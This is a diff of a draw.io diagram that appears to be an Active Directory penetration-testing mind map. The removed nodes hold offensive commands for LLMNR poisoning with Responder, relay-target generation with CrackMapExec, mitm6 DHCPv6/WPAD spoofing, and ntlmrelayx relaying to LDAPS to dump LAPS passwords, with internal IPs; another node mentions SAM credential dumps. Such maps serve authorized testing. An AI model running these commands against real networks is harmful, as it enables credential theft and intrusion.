@@ -1527,20 +1527,6 @@
             <mxPoint x="-375" y="2191" as="targetPoint" />
           </mxGeometry>
         </mxCell>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-2" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-4" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;fontSize=12;fontColor=#FFFFFF;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="ki_T6ywqn6y8RI7Xkelr-11" value="">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-3" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-4" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="ki_T6ywqn6y8RI7Xkelr-42">
-          <mxGeometry relative="1" as="geometry">
-            <Array as="points">
-              <mxPoint x="-350" y="1945" />
-              <mxPoint x="-350" y="2120" />
-            </Array>
-          </mxGeometry>
-        </mxCell>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-4" parent="1" style="whiteSpace=wrap;shadow=0;fontColor=#FFFFFF;fontFamily=Helvetica;fontStyle=1;html=1;fontSize=12;plain-purple;strokeColor=default;fillColor=#12aab5;gradientColor=none;spacing=6;verticalAlign=middle;rounded=1;align=center;spacingBottom=22;" value="Man in the middle" vertex="1">
-          <mxGeometry height="60" width="120" x="-496" y="1915" as="geometry" />
-        </mxCell>
         <mxCell id="ki_T6ywqn6y8RI7Xkelr-5" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-55" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" target="ki_T6ywqn6y8RI7Xkelr-28">
           <mxGeometry relative="1" as="geometry">
             <Array as="points">
@@ -1565,20 +1551,6 @@
             <mxPoint x="1315" y="2135" as="sourcePoint" />
             <mxPoint x="1315" y="2135" as="targetPoint" />
           </mxGeometry>
-        </mxCell>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-9" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-11" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="ki_T6ywqn6y8RI7Xkelr-12">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-10" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-11" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="ki_T6ywqn6y8RI7Xkelr-55">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;Poisonning LLMNR&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&amp;nbsp;#use --lm to force lm downgrade&lt;br&gt;&lt;/font&gt;&lt;font color=&quot;#2a7bde&quot;&gt;#&amp;nbsp;disable smb &amp;amp; http if relay&lt;/font&gt;&lt;/div&gt;" Generate-smb-targets="cme smb --gen-relay-list smb_targets.txt 10.240.5.0/24" poson-LLMNR="responder -I eth0" id="ki_T6ywqn6y8RI7Xkelr-11">
-          <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
-            <mxGeometry height="90" width="240" x="-290" y="1900" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-12" parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" value="Crack Net NTLM Hash" vertex="1">
-          <mxGeometry height="60" width="120" x="50" y="1870" as="geometry" />
         </mxCell>
         <mxCell id="ki_T6ywqn6y8RI7Xkelr-13" parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" value="credentials dump (SAM) if admin&lt;br&gt;&lt;div&gt;or Cmd exec if user&lt;br&gt;&lt;/div&gt;" vertex="1">
           <mxGeometry height="65" width="220" x="830" y="1947" as="geometry" />
@@ -1685,11 +1657,6 @@
             <mxGeometry height="57" width="156" x="830" y="2025" as="geometry" />
           </mxCell>
         </object>
-        <object label="&lt;h2 id=&quot;mitm6--ntlmrelayx-to-ldap&quot;&gt;&lt;font style=&quot;font-size: 14px;&quot;&gt;&lt;span class=&quot;mr-2&quot;&gt;Mitm6 + ntlmrelayx to ldap&lt;/span&gt;&lt;/font&gt;&lt;/h2&gt;&lt;div&gt;(WPAD spoofing + DHCP6 spoffing)&lt;br&gt;&lt;/div&gt;" DHCP6=" mitm6 -i enp0s31f6 -d group.int --debug" relay=" ntlmrelayx.py -6 -wh wpadfakeserver.group.int -t ldaps://10.248.2.86 --remove-mic --dump-laps" id="ki_T6ywqn6y8RI7Xkelr-42">
-          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=light-dark(#000000,#E5A50A);" vertex="1">
-            <mxGeometry height="90" width="180" x="-270" y="2075" as="geometry" />
-          </mxCell>
-        </object>
         <mxCell id="ki_T6ywqn6y8RI7Xkelr-43" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-44" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" target="ki_T6ywqn6y8RI7Xkelr-46" value="">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
@@ -1754,9 +1721,9 @@
             <mxGeometry height="60" width="120" x="50" y="1965" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="ki_T6ywqn6y8RI7Xkelr-56" edge="1" parent="1" source="ki_T6ywqn6y8RI7Xkelr-42" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#ffffff;strokeWidth=1;" target="ki_T6ywqn6y8RI7Xkelr-60" value="">
+        <mxCell id="ki_T6ywqn6y8RI7Xkelr-56" edge="1" parent="1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#ffffff;strokeWidth=1;" target="ki_T6ywqn6y8RI7Xkelr-60" value="">
           <mxGeometry relative="1" as="geometry">
-            <mxPoint x="-120" y="2020" as="sourcePoint" />
+            <mxPoint x="-90" y="2120" as="sourcePoint" />
             <mxPoint x="-810" y="2260" as="targetPoint" />
           </mxGeometry>
         </mxCell>
